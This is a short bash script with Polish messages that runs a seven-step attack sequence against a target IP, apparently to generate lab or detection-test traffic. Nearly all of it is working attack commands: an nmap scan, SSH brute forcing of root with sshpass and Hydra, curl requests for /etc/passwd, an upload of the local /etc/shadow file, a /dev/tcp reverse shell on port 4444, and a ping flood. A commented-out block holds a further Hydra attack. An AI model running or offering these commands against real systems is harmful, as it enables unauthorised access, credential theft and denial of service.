##!/bin/bash
#echo "[*] Rozpoczęcie ataku brute-force na usługę SSH hosta victim.agent..."
#
#WORDLIST="/usr/share/wordlists/passwords.txt"
#
#if [[ ! -f "$WORDLIST" ]]; then
#    echo "[!] Lista haseł nie została znaleziona: $WORDLIST"
#    exit 1
#fi
#
#hydra -l victim -P "$WORDLIST" ssh://victim.agent -t 4 -f
#
#echo "[*] Atak zakończony."


#!/bin/bash
TARGET="" #ADRES IP MASZYNY ATAKOWANEJ

sleep 1
echo "[1/7] Skanowanie portów (nmap)..."
nmap -Pn -sS $TARGET

sleep 2
echo "[2/7] Próba brute-force do SSH..."
for i in {1..5}; do
  sshpass -p "zlehaslo" ssh -o StrictHostKeyChecking=no root@$TARGET -p 22
done

sleep 2
echo "[3/7] Próba brute-force z użyciem Hydra..."
WORDLIST="/usr/share/wordlists/passwords.txt"
if [[ ! -f "$WORDLIST" ]]; then
    echo "[!] Lista haseł nie została znaleziona: $WORDLIST"
else
    hydra -l root -P "$WORDLIST" ssh://$TARGET -t 4 -f
fi

sleep 2
echo "[4/7] Nieautoryzowane próby pobrania plików z serwera..."
curl http://$TARGET/etc/passwd
curl http://$TARGET/secret/file.txt

sleep 2
echo "[5/7] Próba przesłania złośliwego pliku (upload)..."
curl -X POST -F "file=@/etc/shadow" http://$TARGET/upload

sleep 2
echo "[6/7] Próba zdalnego połączenia (reverse shell)..."
bash -i >& /dev/tcp/$TARGET/4444 0>&1

sleep 2
echo "[7/7] Symulowany DoS (ping flood)..."
ping -f -c 100 $TARGET

echo "KONIEC ATAKOW"
